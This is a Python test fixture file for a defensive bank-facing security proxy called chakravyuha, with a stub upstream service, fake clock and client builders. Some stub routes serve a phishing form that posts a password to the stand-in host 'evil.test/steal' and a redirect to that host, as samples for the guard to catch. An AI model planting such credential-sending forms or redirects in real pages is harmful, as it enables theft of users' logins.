import random

import httpx
import pytest
from starlette.applications import Starlette
from starlette.requests import Request
from starlette.responses import JSONResponse, Response
from starlette.routing import Route

from chakravyuha.challenge import COOKIE
from chakravyuha.config import Config
from chakravyuha.decoy import Decoy, default_dataset
from chakravyuha.llm import LLM
from chakravyuha.proxy import create_app
from chakravyuha.state import State

TOKEN = "test-token"


@pytest.fixture
def anyio_backend():
    return "asyncio"


class Clock:
    def __init__(self) -> None:
        self.t = 1000.0

    def __call__(self) -> float:
        return self.t


class Upstream:
    """A stub bank service that records what reached it."""

    def __init__(self) -> None:
        self.seen: list[dict] = []

    async def echo(self, request: Request) -> Response:
        body = await request.body()
        self.seen.append(
            {
                "method": request.method,
                "path": request.url.path,
                "query": request.url.query,
                "headers": dict(request.headers),
                "body": body,
            }
        )
        bank = {"x-bank": "demo"}  # a header of the real service, for the decoy to copy
        if request.url.path == "/login":
            data = await request.json() if body else {}
            ok = data.get("password") == "demo-pass"
            response = JSONResponse({"ok": ok}, 200 if ok else 401, headers=bank)
            if ok:
                response.set_cookie("bank_session", "real-session", path="/", httponly=True)
            return response
        if request.url.path == "/balance":
            body = {"account": "DE00 0000 0000 0042", "balance": 1234.56, "currency": "EUR"}
            return JSONResponse(body, headers=bank)
        if request.url.path == "/phish":  # a form that posts credentials to a foreign host
            html = (
                "<html><body><form action='https://evil.test/steal'>"
                "<input type='password' name='pw'></form></body></html>"
            )
            return Response(html, 200, media_type="text/html")
        if request.url.path == "/loginpage":  # the bank's own same-origin login form (legitimate)
            html = (
                "<html><body><form action='/transaction/login' method='post'>"
                "<input type='password' name='password'></form></body></html>"
            )
            return Response(html, 200, media_type="text/html")
        if request.url.path == "/go":  # a redirect to a foreign host
            return Response("", 302, headers={"location": "https://evil.test/"})
        if request.url.path == "/htmlok":
            return Response("<html><body>welcome</body></html>", 200, media_type="text/html")
        return Response(body, 200, media_type="application/octet-stream")

    def app(self) -> Starlette:
        return Starlette(routes=[Route("/{p:path}", self.echo, methods=["GET", "POST", "PUT"])])


class Sleeps:
    def __init__(self) -> None:
        self.calls: list[float] = []

    async def __call__(self, seconds: float) -> None:
        self.calls.append(seconds)


@pytest.fixture
def make_guard():
    def build(**overrides):
        settings = {
            "data_dir": None,
            "bank_root": None,
            "elk": {"enabled": False},
            "stdout_events": False,
            "challenge": {"difficulty": 4},  # cheap puzzles, so tests can solve them
            "services": {
                "transaction": {
                    "upstream": "http://transaction",
                    "rate": 5,
                    "login_paths": ["/login"],
                }
            },
        }
        settings.update(overrides)
        config = Config.model_validate(settings)
        upstream = Upstream()
        clock = Clock()
        sleeps = Sleeps()
        app = create_app(
            config,
            token=TOKEN,
            transport=httpx.ASGITransport(app=upstream.app()),
            state=State(config, clock=clock),
            sleep=sleeps,
            decoy=Decoy(config, dataset=default_dataset(), rng=random.Random(4)),
            llm=LLM(api_key=""),  # agents run their rules; tests that need a model pass one
        )
        guard = app.state.guard

        def client(ip: str = "10.0.0.1", session: bool = True) -> httpx.AsyncClient:
            """A client at `ip`. With `session`, it holds a valid ring 3 cookie for that IP, as a
            browser would after solving the challenge (ring 3 itself is in test_challenge.py)."""
            transport = httpx.ASGITransport(app=app, client=(ip, 40000))
            cookies = {COOKIE: guard.challenger.make_session(ip, 1800)} if session else None
            return httpx.AsyncClient(transport=transport, base_url="http://guard", cookies=cookies)

        return guard, upstream, clock, sleeps, client

    return build
